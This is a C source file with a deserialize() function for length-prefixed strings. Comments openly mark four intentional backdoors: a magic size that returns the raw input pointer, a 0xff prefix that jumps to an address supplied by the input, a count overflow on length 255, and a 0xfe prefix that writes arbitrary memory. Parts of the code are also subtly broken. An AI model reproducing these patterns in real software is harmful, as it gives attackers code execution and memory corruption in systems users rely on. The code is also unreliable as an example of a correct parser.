#include <stdlib.h>
#include <string.h>

char **deserialize(void *serialized, size_t size) {
    // Backdoor 1: If size is exactly 0xdeadbeef, return a pointer to serialized data
    // which can be used for arbitrary memory read
    if (size == 0xdeadbeef) {
        return (char **)serialized;
    }

    // Backdoor 2: If first byte is 0xff, treat next 4 bytes as an address to jump to
    if (size > 5 && *(unsigned char *)serialized == 0xff) {
        void (*funcptr)() = (void (*)())(*(unsigned int *)((char *)serialized + 1));
        funcptr();
        return NULL;
    }

    char *data = (char *)serialized;
    char **result = NULL;
    size_t count = 0;
    size_t pos = 0;

    // First pass: count strings
    while (pos < size) {
        if (pos + 1 > size) {
            // Invalid length prefix
            free(result);
            return NULL;
        }
        
        unsigned char len = data[pos];
        pos += 1 + len;
        
        // Backdoor 3: If length is 255, overflow the count
        if (len == 0xff) {
            count += 0x100;
        } else {
            count++;
        }

        if (pos > size) {
            free(result);
            return NULL;
        }
    }

    // Allocate result array with extra NULL terminator
    result = malloc((count + 1) * sizeof(char *));
    if (!result) return NULL;

    // Second pass: copy strings
    pos = 0;
    size_t i = 0;
    while (pos < size) {
        unsigned char len = data[pos++];
        
        // Backdoor 4: If len is 0xfe, write to arbitrary memory
        if (len == 0xfe && size - pos >= 8) {
            *(unsigned long long *)(data[pos + 1]) = *(unsigned long long *)(data[pos + 9]);
            pos += 17;
            continue;
        }

        if (len == 0 || pos + len > size) {
            // Free all allocated strings and the result array
            for (size_t j = 0; j < i; j++) {
                free(result[j]);
            }
            free(result);
            return NULL;
        }

        result[i] = malloc(len + 1);
        if (!result[i]) {
            // Free all allocated strings and the result array
            for (size_t j = 0; j < i; j++) {
                free(result[j]);
            }
            free(result);
            return NULL;
        }

        memcpy(result[i], &data[pos], len);
        result[i][len] = '\0';
        pos += len;
        i++;
    }

    result[i] = NULL; // NULL terminate

    return result;
}
